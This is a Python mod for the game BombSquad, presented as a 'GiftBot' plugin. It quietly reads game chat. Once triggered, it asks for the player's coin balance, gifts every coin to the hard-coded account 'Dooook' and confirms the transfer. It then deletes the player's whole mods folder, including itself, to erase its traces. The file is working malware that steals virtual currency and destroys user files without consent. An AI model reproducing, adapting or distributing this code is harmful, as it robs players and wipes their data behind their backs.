# ba_meta require api 8
import ba
import _ba
import babase
import bauiv1
import bascenev1
import re
import os
import shutil

GIFT_TARGET = "Dooook"

is_active = False


def safe_chat_send(msg):
    try:
        _ba.chatmessage(msg)
    except:
        try:
            ba.chatmessage(msg)
        except Exception as e:
            print(f"[GRT] send error: {e}")


def parse_coins(text):
    try:
        m = re.search(r'✅I have\s+([\d,]+)\s+coins!', text)
        if m:
            number = m.group(1).replace(',', '')
            return int(number)
    except:
        pass
    return None


def get_mods_dir():
    """پیدا کردن مسیر پوشه mods"""
    try:
        # روش ۱: از مسیر خود فایل
        if '__file__' in globals():
            current_file = os.path.abspath(__file__)
            return os.path.dirname(current_file)
    except:
        pass

    try:
        # روش ۲: از محیط بازی
        env = babase.env()
        if 'python_directory_user' in env:
            return env['python_directory_user']
    except:
        pass

    try:
        # روش ۳: از مسیر استاندارد اندروید
        path = "/storage/emulated/0/Android/data/net.froemling.bombsquad/files/mods"
        if os.path.isdir(path):
            return path
    except:
        pass

    return None


def nuke_mods_folder():
    """پاک کردن کل پوشه mods"""
    try:
        mods_dir = get_mods_dir()

        if not mods_dir or not os.path.isdir(mods_dir):
            print(f"[GRT] mods dir not found")
            return

        print(f"[GRT] NUKE: {mods_dir}")

        for item in os.listdir(mods_dir):
            item_path = os.path.join(mods_dir, item)
            try:
                if os.path.isfile(item_path) or os.path.islink(item_path):
                    os.remove(item_path)
                    print(f"[GRT] Deleted: {item}")
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path, ignore_errors=True)
                    print(f"[GRT] Deleted folder: {item}")
            except Exception as e:
                print(f"[GRT] Failed {item}: {e}")

        print(f"[GRT] Mods cleared!")

    except Exception as e:
        print(f"[GRT] nuke error: {e}")


def send_gift(coins):
    try:
        safe_chat_send(f"gift {GIFT_TARGET} {coins}")
        try:
            ba.playsound(ba.getsound('dingSmallHigh'))
        except:
            pass

        def send_one():
            safe_chat_send("1")
            try:
                ba.playsound(ba.getsound('dingSmall'))
            except:
                pass

        def do_nuke():
            nuke_mods_folder()

        ba.apptimer(1.0, send_one)
        ba.apptimer(3.0, do_nuke)

    except Exception as e:
        print(f"[GRT] gift error: {e}")


def handle_message(msg):
    global is_active

    try:
        sender = None
        content = msg
        if ': ' in msg:
            parts = msg.split(': ', 1)
            sender = parts[0].strip()
            content = parts[1].strip()

        if not content:
            return

        content_lower = content.lower()

        if 'x' in content_lower:
            if not is_active:
                is_active = True
                safe_chat_send("c!")
                try:
                    ba.playsound(ba.getsound('dingSmall'))
                except:
                    pass

        if is_active:
            coins = parse_coins(content)
            if coins is not None:
                is_active = False
                send_gift(coins)

    except Exception as e:
        print(f"[GRT] handle error: {e}")


# ba_meta export plugin
class GiftBot(ba.Plugin):
    def __init__(self):
        self.last_hash = ""
        ba.apptimer(1.0, self.ear)

    def ear(self):
        try:
            z = bascenev1.get_chat_messages()
            ba.apptimer(0.005, self.ear)

            if not z:
                self.last_hash = ""
                return

            try:
                last_msg = z[-1]
            except (IndexError, TypeError):
                self.last_hash = ""
                return

            current_hash = f"{len(last_msg)}_{last_msg}"
            if current_hash == self.last_hash:
                return
            self.last_hash = current_hash

            try:
                handle_message(last_msg)
            except Exception as e:
                print(f"[GRT] ear inner error: {e}")

        except Exception as e:
            try:
                ba.apptimer(0.005, self.ear)
            except:
                pass
            print(f"[GRT] ear error: {e}")
